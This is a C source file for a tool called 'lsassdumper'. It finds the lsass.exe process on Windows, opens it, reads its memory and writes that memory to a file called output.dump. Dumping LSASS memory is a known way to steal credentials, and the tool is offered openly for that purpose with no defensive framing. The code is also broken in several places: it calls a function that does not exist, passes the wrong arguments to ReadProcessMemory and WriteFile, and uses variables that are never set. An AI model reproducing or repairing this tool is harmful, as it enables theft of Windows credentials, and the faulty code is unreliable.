//
// Created by peroxidee / iluvwerewolves on 2/6/25, visit https://werewolves.gay for more information
//
#include <stdio.h>
#include "lsassdumper.h"
#include <windows.h>


#define g(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)



DWORD findproc(const char* proc){

  DWORD pid = 0;
  HANDLE hProcessSnap;
  HANDLE hProcess;
  PROCESSENTRY32 pe32;
  hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

  if (hProcessSnap == INVALID_HANDLE_VALUE) {
            e(" cannot locate proper handle value, exiting");
    return(0);
  }

  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (!Process32First(hProcessSnap, &pe32)) {
    printError(TEXT("hProcessSnap"));
    CloseHandle(hProcessSnap);
    e(" cannot get process information, exiting");
    return(0);
  }

  do {
    i("checking process %ls\n", pe32.szExeFile);
    if (0==strcmp(pe32.szExeFile, proc)) {
        pid = pe32.th32ProcessID;
        g("process %ls is at PID #%ld\n", pe32.szExeFile, pid);
        break;
    }
  }
  while (Process32Next(hProcessSnap, &pe32));

  CloseHandle(hProcessSnap);


  return pid;

}



int main(int argc, char **argv){
  i("lsassdumper starting...");

  i("getting process...\n");

    DWORD PID = findproc("lsass.exe");
    if (PID == 0) {
      e(" returning with error code 1");
         return 1;
      }

  HANDLE h = OpenProcess(WRITE_OWNER, true, PID);

  LPVOID dumpedBuf;
  size_t bytesWritten = 0;
  PPROCESS_MEMORY_COUNTERS procmemc;
  if (GetProcessMemory(h, procmemc, procmemc.cb)) {
    size_t b2br = procmemc.WorkingSetSize;
  } else { e("getting process memory info failed"); return 1; }


  if (ReadProcessMemory(h, (void*)&PID, dumpedBuf, &PID, b2br, bytesWritten)) {

    HANDLE hFile = CreateFile(
       L"output.dump",
       GENERIC_WRITE,
       0,
       NULL,
       CREATE_ALWAYS,
       FILE_ATTRIBUTE_NORMAL,
       NULL
   );
    if (hFile == INVALID_HANDLE_VALUE) {
      e(" cannot open output file"); return 1;
    }
    DWORD dwWritten = 0;
      if(!WriteFile(hFile, dumpedBuf, PID, b2br, &dwWritten)) {
        CloseHandle(hFile);
        e(" cannot write to output file"); return 1;

      }
    CloseHandle(hFile);
    g(" written to output file");
  }
    else { e(" returning with error code 1"); return 1; }



    return 0;
}

